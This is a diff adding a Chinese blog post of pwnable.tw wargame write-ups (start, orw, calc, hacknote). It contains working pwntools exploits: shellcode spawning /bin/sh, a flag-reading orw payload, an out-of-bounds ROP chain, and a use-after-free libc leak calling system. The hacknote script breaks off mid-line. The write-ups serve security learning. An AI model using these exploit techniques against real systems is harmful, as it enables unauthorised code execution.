@@ -141,6 +141,283 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/01/09/pwnable-tw记录/" >pwnable.tw记录</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-09  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="pwnable-tw记录"><a href="#pwnable-tw记录" class="headerlink" title="pwnable.tw记录"></a>pwnable.tw记录</h1><blockquote>
+<p>更新中.jpg</p>
+</blockquote>
+<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><blockquote>
+<p>栈溢出，ret2shellocde</p>
+<p>程序流程：执行一次write函数和一次read函数。</p>
+<ul>
+<li>第一次栈溢出，劫持程序返回write函数的赋参地址（接下来write会将之前的esp地址输出）</li>
+<li>第二次write输出esp地址，read函数布置栈空间，放上shellcode，并通过esp的偏移找到shellcode的地址，放在返回地址上。</li>
+</ul>
+</blockquote>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CDesktop%5C20200423213641742.png" alt="20200423213641742"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210104164903387.png" alt="image-20210104164903387"></p>
+<p>因为第一次最后面retn的时候pop eip，所以第二次write的时候，esp会在0xffffd10c也就是旧的esp的地方。</p>
+<p>第二次read的时候，因为add esp,14h，所以这里的覆盖量还是0x14</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./start'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048060")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)<span class="comment">#不是sendline，否则0x0a会覆盖esp地址的低地址</span></span><br><span class="line"></span><br><span class="line">esp = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">shellcode_addr = esp + <span class="number">0x14</span><span class="comment">#后来的返回地址和之前的esp就差一个0x14，因为最后一个（add esp,14h）</span></span><br><span class="line">log.success(<span class="string">"shellcode_addr:"</span>+hex(shellcode_addr))</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span><span class="comment">#32位较短的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"b"</span>*<span class="number">0x14</span>+p32(shellcode_addr) + shellcode</span><br><span class="line">log.success(<span class="string">"len:"</span>+hex(len(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/105717621" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/105717621</a></p>
+<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><blockquote>
+<p>开启了沙箱，只能执行open、read和write函数</p>
+<p>程序流程：输入shellcode，执行shellcode，但shellcode里面只能orw</p>
+<p>找orw的shellcode即可。</p>
+<p><a href="https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3</a></p>
+</blockquote>
+<p>shellcode的编写思路</p>
+<ol>
+<li><p>打开flag文件（open）</p>
+</li>
+<li><p>将文件内内容读到（read）指定位置的栈上（其实哪里东西，，，注意不会被覆盖就行）</p>
+</li>
+<li><p>用write函数读取指定位置的信息即可。</p>
+</li>
+</ol>
+<h3 id="32位函数寄存器"><a href="#32位函数寄存器" class="headerlink" title="32位函数寄存器"></a>32位函数寄存器</h3><ul>
+<li>第一个参数：ebx</li>
+<li>第二个参数：ecx</li>
+<li>第三个参数：edx</li>
+</ul>
+<h3 id="int-0x80调用表"><a href="#int-0x80调用表" class="headerlink" title="int 0x80调用表"></a>int 0x80调用表</h3><blockquote>
+<p>几个常用的，不常用的见<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">百度</a></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>%eax</strong></th>
+<th><strong>Name</strong></th>
+<th><strong>Source</strong></th>
+<th><strong>%ebx</strong></th>
+<th><strong>%ecx</strong></th>
+<th><strong>%edx</strong></th>
+<th><strong>%esx</strong></th>
+<th><strong>%edi</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>sys_exit</td>
+<td>kernel/exit.c</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>2</td>
+<td>sys_fork</td>
+<td>arch/i386/kernel/process.c</td>
+<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>3</td>
+<td>sys_read</td>
+<td>fs/read_write.c</td>
+<td>unsigned int</td>
+<td>char *</td>
+<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>4</td>
+<td>sys_write</td>
+<td>fs/read_write.c</td>
+<td>unsigned int</td>
+<td>const char *</td>
+<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sys_open</td>
+<td>fs/open.c</td>
+<td>const char *</td>
+<td>int</td>
+<td>int</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>6</td>
+<td>sys_close</td>
+<td>fs/open.c</td>
+<td>unsigned int</td>
+<td>-</td>
+<td>-</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>函数原型：<code>int open(const char * pathname, int flags, mode_t mode);</code></p>
+<p>flags表示读写权限，0表示只读</p>
+<ul>
+<li><code>O_RDONLY</code>：以只读方式打开文件。</li>
+<li><code>O_WRONLY</code>：以只写方式打开文件。</li>
+<li><code>O_RDWR</code>：以可读写方式打开文件。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int fd = open(<span class="string">"/home/orw/flag"</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#将字符串"/home/orw/flag"放入栈中</span></span><br><span class="line">push <span class="number">0x00006761</span></span><br><span class="line">push <span class="number">0x6c662f77</span></span><br><span class="line">push <span class="number">0x726f2f65</span></span><br><span class="line">push <span class="number">0x6d6f682f</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="number">0x0068732f</span></span><br><span class="line"><span class="number">0x00006873</span></span><br><span class="line"><span class="number">0x6E69622f</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x5#open函数调用号</span><br><span class="line">mov ebx,esp#第一个参数为字符串地址，因为字符串在刚刚压栈，就是esp</span><br><span class="line">xor ecx,ecx#第二个参数为0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210104213908883.png" alt="image-20210104213908883"></p>
+<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>函数原型：<code>ssize_t read(int fd, void *buf, size_t count);</code></p>
+<p>fd是文件描述符</p>
+<ul>
+<li><p>标准输入（standard input）的文件描述符是 0</p>
+</li>
+<li><p>标准输出（standard output）的文件描述符是 1</p>
+</li>
+</ul>
+<p>所以这里将open函数的返回值作为文件描述符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,<span class="number">0x30</span>);//直接用之前的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax#fp的地址，也就是open函数返回地址</span><br><span class="line">mov ecx,esp#读入到栈上，因为后续没有push、pop等操作，所以esp不变</span><br><span class="line">mov edx,0x30#长度</span><br><span class="line">mov eax,0x3#read函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>函数原型：<code>ssize_t write(int fd, const void *buf, size_t nbyte);</code></p>
+<p>标准输出，故文件描述符为1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,0x1#文件描述符为1</span><br><span class="line">mov eax,0x4#write函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./orw'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Give my your shellcode:"</span>)</span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p><a href="https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0</a></p>
+<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
+<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><blockquote>
+<p>实现了一个计算器的功能，由于逻辑不严密，导致可以构造非法式子，修改内存的值。</p>
+<p>需要耐心分析程序，<del>maybe还需要脑洞大开</del></p>
+</blockquote>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108173852141.png" alt="image-20210108173852141"></p>
+<p>主函数很简单，主要看calc函数</p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108174030310.png" alt="image-20210108174030310"></p>
+<p>主要有三个函数，get_expr用来输入计算公式并过滤非法字符；init_pool在站上分配一段空间并将内容清0；parse_expr是主要函数，用于对计算公式解析并计算。最后由printf函数打印输出结果。</p>
+<p>注意：函数结束的条件是<code>!get_expr((int)&amp;expr_0, 1024)</code>输入的字符串长度大于1024，然后可以返回main继续执行。</p>
+<h3 id="bzero函数"><a href="#bzero函数" class="headerlink" title="bzero函数"></a>bzero函数</h3><p>原型：extern void bzero（void *s, int n）;</p>
+<ul>
+<li>s 要置零的数据的起始地址</li>
+<li>n 要置零的数据字节个数</li>
+</ul>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108174912889.png" alt="image-20210108174912889"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210108175150201.png" alt="image-20210108175150201"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110211310303.png" alt="image-20210110211310303"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110211900726.png" alt="image-20210110211900726"></p>
+<p>这里需要好好理解。</p>
+<p>漏洞在于，</p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110212502340.png" alt="image-20210110212502340"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110213412358.png" alt="image-20210110213412358"></p>
+<p>最后在栈内布置如下rop</p>
+<table>
+<thead>
+<tr>
+<th>值</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x0805c34b</td>
+<td>pop eax ; ret</td>
+</tr>
+<tr>
+<td>11</td>
+<td>数值</td>
+</tr>
+<tr>
+<td>0x080701aa</td>
+<td>pop edx ; ret</td>
+</tr>
+<tr>
+<td>0</td>
+<td>数值</td>
+</tr>
+<tr>
+<td>0x080701d1</td>
+<td>pop ecx ; pop ebx ; ret</td>
+</tr>
+<tr>
+<td>0</td>
+<td>数值</td>
+</tr>
+<tr>
+<td>binsh地址</td>
+<td>通过main ebp计算得到</td>
+</tr>
+<tr>
+<td>0x08049a21</td>
+<td>int 0x80</td>
+</tr>
+<tr>
+<td>0x6E69622f</td>
+<td>“/bin”</td>
+</tr>
+<tr>
+<td>0x0068732f</td>
+<td>“/sh\x00”</td>
+</tr>
+</tbody></table>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./calc'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10100)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">"==="</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ebp_base = p.recv()</span><br><span class="line">ebp_base = int(ebp_base)</span><br><span class="line">print(<span class="string">"[*]ebp_base1:"</span>+str(ebp_base))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]ebp_base2:"</span>+hex( int(ebp_base) &amp; <span class="number">0xffffffff</span> ))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"+361+77490"</span></span><br><span class="line">payload2 = <span class="string">"+362-77479"</span></span><br><span class="line">payload3 = <span class="string">"+363+134599427"</span></span><br><span class="line">payload4 = <span class="string">"+364-134599427"</span></span><br><span class="line">payload5 = <span class="string">"+365+77518"</span></span><br><span class="line">payload6 = <span class="string">"+366-77518"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(payload6)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=ebp_base + <span class="number">4</span></span><br><span class="line">diff_367=bin_sh_addr - <span class="number">77518</span></span><br><span class="line">p.sendline(<span class="string">'+367'</span>+str(diff_367))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'+368'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_368 = p.recvline()</span><br><span class="line">diff_368 =  <span class="number">134519329</span> - int(num_368)</span><br><span class="line">print(<span class="string">"[*]diff_368:"</span>+str(diff_368))</span><br><span class="line">print(<span class="string">"[*]num_368:"</span>+str(num_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+368"</span>)</span><br><span class="line">p.sendline(<span class="string">"+368+"</span>+str(diff_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+369"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_369 = p.recvline()</span><br><span class="line">diff_369 = <span class="number">1852400175</span> - int(num_369)</span><br><span class="line">p.sendline(<span class="string">"+369+"</span>+str(diff_369))</span><br><span class="line">print(<span class="string">"[*]num_369:"</span>+str(num_369))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+370"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">num_370 = p.recvline()</span><br><span class="line">print(<span class="string">"[*]num_370:"</span>+str(num_370))</span><br><span class="line">diff_370 = int(num_370) - <span class="number">6845231</span></span><br><span class="line">p.sendline(<span class="string">"+370-"</span>+str(diff_370))</span><br><span class="line">print(<span class="string">"[*]diff_370:"</span>+str(diff_370))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">2048</span>)</span><br><span class="line">p.sendline(<span class="string">"+361"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p><a href="https://www.freebuf.com/articles/system/189636.html" target="_blank" rel="noopener">从pwnable.tw-calc看数组越界造成的任意地址读写</a></p>
+<p>youtube上视频：<a href="https://www.youtube.com/watch?v=LTgNNE04x2w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LTgNNE04x2w</a></p>
+<h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><blockquote>
+<p>栈溢出</p>
+</blockquote>
+<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><blockquote>
+<p>简单的堆题，uaf（类似于hitcon的uaf）</p>
+<p>难点在于libc没有字符串’/bin/sh’，解决方法在于直接将字符串“||sh”作为字符串地址传入即可。</p>
+</blockquote>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110205251966.png" alt="image-20210110205251966"></p>
+<p>打印内容的语句，能否打印是判断该idx的ptr[i]是否存在</p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110205533787.png" alt="image-20210110205533787"></p>
+<p><img src="/2021/01/09/%C2%96pwnable-tw%E8%AE%B0%E5%BD%95/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210110205601001.png" alt="image-20210110205601001"></p>
+<p>首先修改参数为got表地址，泄漏libc基址，然后修改函数地址为system，后面为“||sh”</p>
+<h3 id="system-getshell参数"><a href="#system-getshell参数" class="headerlink" title="system getshell参数"></a>system getshell参数</h3><ol>
+<li>‘/bin/sh’字符串地址</li>
+<li>‘sh’字符串地址</li>
+<li>‘||sh’字符串（感觉非常有用，，，哈哈哈）</li>
+</ol>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./hacknote_4'</span></span><br><span class="line">p = process(filename)</span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./hacknote_4"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Your choice :")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请两个非0大小的块(而且要一样，不然不好使【不知道为什么，大佬教教我。。。】)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将两个块的头malloc，其中一个还是ptr[i]，另一个0x8大小的作为数据区</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862b</span>)+p32(elf.got[<span class="string">'atoi'</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为原先两个ptr[i]都申请回来了，所以可以将上面前四个字节作为函数，后四个字节作为参数地址。</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = (u32(p.recv()[:<span class="number">4</span>]))</span><br><span class="line">log.success(<span class="string">"atoi:"</span>+str(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = (atoi_addr) - (libc.symbols[<span class="string">'atoi'</span>])</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为没有edit函数，所以先delete再add做修改。</span></span><br><span class="line">delete(<span 